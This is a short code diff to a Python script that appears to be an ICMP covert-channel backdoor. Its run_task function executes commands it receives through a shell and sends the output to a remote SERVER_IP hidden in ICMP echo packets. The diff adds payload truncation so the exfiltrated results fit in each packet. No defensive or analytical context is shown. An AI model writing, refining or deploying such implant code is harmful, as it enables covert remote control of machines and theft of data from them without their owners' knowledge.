@@ -32,14 +32,34 @@ def handle_incoming(pkt):
 def run_task(cmd):
     # Execute and send back results
     import subprocess
+    MAX_PAYLOAD = 1460
+    PREFIX = b"RESULT|"
+
     try:
         output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
-        result = output.decode()
+        result_bytes = output
     except Exception as e:
-        result = str(e)
+        result_bytes = str(e).encode(errors="ignore")
 
-    pkt = IP(dst=SERVER_IP)/ICMP(type=8)/f"RESULT|{result}".encode()
+    # Leave room for prefix
+    max_result_bytes = MAX_PAYLOAD - len(PREFIX)
+
+    # Truncate safely
+    result_bytes = result_bytes[:max_result_bytes]
+
+    payload = PREFIX + result_bytes
+
+    pkt = IP(dst=SERVER_IP)/ICMP(type=8)/payload
     send(pkt, verbose=0)
+
+    # try:
+    #     output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+    #     result = output.decode()
+    # except Exception as e:
+    #     result = str(e)
+
+    # pkt = IP(dst=SERVER_IP)/ICMP(type=8)/f"RESULT|{result}".encode()
+    # send(pkt, verbose=0)
     print(f"[+] Sent results")
 
 if __name__ == "__main__":
